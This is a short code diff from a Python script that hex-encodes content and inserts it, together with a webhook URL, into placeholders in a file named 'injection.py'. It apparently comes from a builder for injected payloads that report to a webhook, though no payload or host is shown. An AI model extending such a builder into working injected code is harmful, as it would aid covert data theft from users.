@@ -9,7 +9,7 @@ with open('injection.py', 'rb') as file:
     contentinj = file.read()
 
 hex_content = string_to_hex(content)
-hook_url = string_to_hex("")
+hook_url = ""
 
 contentinj = contentinj.replace(b"%code%", hex_content).replace(b"%hookurl%", hook_url)
 
